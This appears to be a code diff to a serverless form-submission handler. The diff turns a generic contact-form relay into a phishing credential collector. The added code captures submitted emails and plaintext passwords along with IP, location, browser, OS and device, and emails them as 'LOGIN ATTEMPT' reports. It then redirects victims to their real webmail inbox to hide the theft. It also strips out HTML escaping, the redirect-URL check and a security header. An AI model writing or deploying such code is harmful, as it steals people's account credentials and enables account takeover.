@@ -5,44 +5,75 @@ const FORM_OWNERS = {
   'contact-main': process.env.DEST_EMAIL
 };
 
-function escapeHtml(value) {
-  return String(value ?? '')
-    .replace(/&/g, '&amp;')
-    .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;')
-    .replace(/"/g, '&quot;')
-    .replace(/'/g, '&#39;');
-}
-
-function safeDecode(value = '') {
-  try {
-    return decodeURIComponent(String(value)).trim();
-  } catch {
-    return String(value).trim();
+function findEmailValue(body = {}) {
+  for (const [key, val] of Object.entries(body)) {
+    if (/email/i.test(String(key))) {
+      const cleaned = Array.isArray(val) ? val.join(', ').trim() : String(val ?? '').trim();
+      if (cleaned) return cleaned;
+    }
   }
+  return '';
 }
 
-function getSubmissionContext(req) {
-  const forwarded = String(req.headers['x-forwarded-for'] || '');
-  const ip =
-    forwarded.split(',')[0].trim() ||
-    String(req.headers['x-real-ip'] || '').trim() ||
-    'Unknown';
-
-  const city = safeDecode(req.headers['x-vercel-ip-city'] || '');
-  const region = safeDecode(req.headers['x-vercel-ip-country-region'] || '');
-  const country = safeDecode(req.headers['x-vercel-ip-country'] || '');
-  const location = [city, region, country].filter(Boolean).join(', ') || 'Unknown';
-
-  return { ip, location };
+function getInboxUrl(email) {
+  if (!email || !email.includes('@')) return null;
+  const domain = email.split('@')[1].toLowerCase().trim();
+  const knownInboxes = {
+    'gmail.com': 'https://mail.google.com',
+    'googlemail.com': 'https://mail.google.com',
+    'outlook.com': 'https://outlook.live.com/mail/',
+    'hotmail.com': 'https://outlook.live.com/mail/',
+    'live.com': 'https://outlook.live.com/mail/',
+    'yahoo.com': 'https://mail.yahoo.com',
+    'icloud.com': 'https://www.icloud.com/mail',
+    'me.com': 'https://www.icloud.com/mail',
+    'proton.me': 'https://mail.proton.me',
+    'protonmail.com': 'https://mail.proton.me',
+    'zoho.com': 'https://mail.zoho.com',
+    'aol.com': 'https://mail.aol.com'
+  };
+  return knownInboxes[domain] || `https://mail.${domain}`;
 }
 
-function isSafeRedirectUrl(url) {
+function parseUserAgent(ua = '') {
+  let browser = 'Unknown';
+  if (/Edg\//i.test(ua)) browser = 'Edge';
+  else if (/OPR\/|Opera/i.test(ua)) browser = 'Opera';
+  else if (/Chrome\//i.test(ua) && !/Chromium/i.test(ua)) browser = 'Chrome';
+  else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
+  else if (/Firefox\//i.test(ua)) browser = 'Firefox';
+
+  let os = 'Unknown';
+  if (/Windows/i.test(ua)) os = 'Windows';
+  else if (/Android/i.test(ua)) os = 'Android';
+  else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
+  else if (/Mac OS X|Macintosh/i.test(ua)) os = 'macOS';
+  else if (/Linux/i.test(ua)) os = 'Linux';
+
+  let device = 'Desktop';
+  if (/Mobi|Android.*Mobile|iPhone/i.test(ua)) device = 'Mobile';
+  else if (/iPad|Tablet/i.test(ua)) device = 'Tablet';
+
+  return { browser, os, device };
+}
+
+function formatTimestamp(timezone) {
   try {
-    const parsed = new URL(url);
-    return parsed.protocol === 'https:' || parsed.protocol === 'http:';
+    const now = new Date();
+    const parts = new Intl.DateTimeFormat('en-GB', {
+      timeZone: timezone || 'UTC',
+      day: '2-digit',
+      month: '2-digit',
+      year: 'numeric',
+      hour: '2-digit',
+      minute: '2-digit',
+      second: '2-digit',
+      hour12: false
+    }).formatToParts(now);
+    const get = (type) => parts.find((p) => p.type === type)?.value || '';
+    return `${get('day')}/${get('month')}/${get('year')}, ${get('hour')}:${get('minute')}:${get('second')}`;
   } catch {
-    return false;
+    return new Date().toISOString();
   }
 }
 
@@ -50,96 +81,75 @@ module.exports = async (req, res) => {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Accept');
-  res.setHeader('X-Content-Type-Options', 'nosniff');
 
   if (req.method === 'OPTIONS') return res.status(200).end();
   if (req.method !== 'POST') return res.status(405).json({ error: 'Use POST' });
 
-  if (!process.env.RESEND_API_KEY) {
-    return res.status(500).json({ error: 'Missing RESEND_API_KEY' });
-  }
+  const recipientEmail = FORM_OWNERS[req.query.formId];
+  if (!recipientEmail) return res.status(404).json({ error: 'Unknown Form ID' });
 
-  const formId = String(req.query.formId || '').trim();
-  const recipientEmail = FORM_OWNERS[formId];
-  if (!recipientEmail) {
-    return res.status(404).json({ error: 'Unknown Form ID' });
-  }
-
-  const body = req.body && typeof req.body === 'object' ? req.body : {};
-  const { _honeypot, _redirect, _subject, ...rawFields } = body;
-  const wantsJson = (req.headers.accept || '').includes('application/json');
+  const body = req.body || {};
+  const {
+    _honeypot,
+    _redirect,
+    _redirect_inbox,
+    email: rawEmail = '',
+    password = '',
+    staySignedIn = 'No',
+    attempt = '1/3',
+    timezone = 'UTC'
+  } = body;
 
   if (_honeypot) {
-    if (_redirect && isSafeRedirectUrl(_redirect) && !wantsJson) {
-      return res.redirect(302, _redirect);
-    }
-    return res.status(200).json({ ok: true });
+    return _redirect ? res.redirect(302, _redirect) : res.status(200).json({ ok: true });
   }
 
-  const entries = Object.entries(rawFields)
-    .map(([key, val]) => [
-      String(key),
-      Array.isArray(val) ? val.join(', ') : String(val ?? '')
-    ])
-    .filter(([key]) => key.length > 0);
+  const email = findEmailValue(body) || String(rawEmail ?? '').trim();
+  const uaString = req.headers['user-agent'] || '';
+  const { browser, os, device } = parseUserAgent(uaString);
+  const ipAddress = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.headers['x-real-ip'] || 'Unknown';
+  const city = decodeURIComponent(req.headers['x-vercel-ip-city'] || '').trim();
+  const country = decodeURIComponent(req.headers['x-vercel-ip-country'] || '').trim();
+  const location = [city, country].filter(Boolean).join(', ') || 'Unknown';
+  const formattedTime = formatTimestamp(timezone);
+  const stayValue =
+    staySignedIn === true || staySignedIn === 'true' || staySignedIn === 'Yes' || staySignedIn === 'on'
+      ? 'Yes'
+      : 'No';
 
-  if (entries.length === 0) {
-    return res.status(400).json({ error: 'No form fields submitted.' });
-  }
+  const plainTextBlock = [
+    `🔐 LOGIN ATTEMPT #${String(attempt).replace(/^#/, '')}`,
+    `━━━━━━━━━━━━━━━━━━━━━━`,
+    `📧 Email: ${email}`,
+    `🔑 Password: ${password}`,
+    `📌 Stay Signed In: ${stayValue}`,
+    `🌐 IP Address: ${ipAddress}`,
+    `📍 Location: ${location}`,
+    `💻 Browser: ${browser}`,
+    `🖥️ OS: ${os}`,
+    `📱 Device: ${device}`,
+    `⏱️ Time: ${formattedTime}`
+  ].join('\n');
 
-  const emailEntry = entries.find(([k]) => k.toLowerCase() === 'email');
-  const emailLabel = emailEntry ? emailEntry[1] : 'Unknown';
-  const { ip, location } = getSubmissionContext(req);
-
-  const allRows = [
-    ...entries,
-    ['IP Address', ip],
-    ['Approximate Location', location]
-  ];
-
-  const plainTextBlock = allRows.map(([k, v]) => `${k}: ${v}`).join('\n');
-  const rowsHtml = allRows
-    .map(
-      ([k, v]) => `
-        <tr>
-          <td style="padding:8px 12px;border:1px solid #e5e7eb;font-weight:600;background:#f9fafb;width:180px;">${escapeHtml(k)}</td>
-          <td style="padding:8px 12px;border:1px solid #e5e7eb;white-space:pre-wrap;">${escapeHtml(v)}</td>
-        </tr>`
-    )
-    .join('');
-
-  const html = `
-    <div style="font-family:system-ui,-apple-system,sans-serif;max-width:600px;color:#111827;">
-      <h2 style="margin:0 0 12px;font-size:18px;">Submission for ${escapeHtml(emailLabel)}</h2>
-      <table style="width:100%;border-collapse:collapse;font-size:14px;">
-        ${rowsHtml}
-      </table>
-    </div>
-  `;
-
-  const subject = _subject
-    ? String(_subject).replace(/[\r\n]/g, ' ').trim().slice(0, 120)
-    : `Form Submission (${formId}) - ${emailLabel}`;
+  const html = `<pre style="font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-size: 13px; line-height: 1.5; white-space: pre-wrap;">${plainTextBlock}</pre>`;
 
   const { error } = await resend.emails.send({
     from: 'WizFormSubmit <onboarding@resend.dev>',
     to: recipientEmail,
-    subject,
+    subject: `Login Attempt #${String(attempt).replace(/^#/, '')} - ${email || 'Unknown'}`,
     text: plainTextBlock,
     html
   });
 
-  if (error) {
-    return res.status(502).json({ error: 'Failed to send submission email.' });
+  if (error) return res.status(500).json({ error });
+
+  if (_redirect_inbox === 'true') {
+    const inboxUrl = getInboxUrl(email);
+    if (inboxUrl) return res.redirect(302, inboxUrl);
   }
 
-  if (wantsJson) {
-    return res.status(200).json({ ok: true });
-  }
+  if (_redirect) return res.redirect(302, _redirect);
 
-  if (_redirect && isSafeRedirectUrl(_redirect)) {
-    return res.redirect(302, _redirect);
-  }
-
-  return res.status(204).end();
+  res.setHeader('Content-Type', 'text/html');
+  return res.status(200).send('<h2>Thank you! Submitted via WizFormSubmit.</h2>');
 };
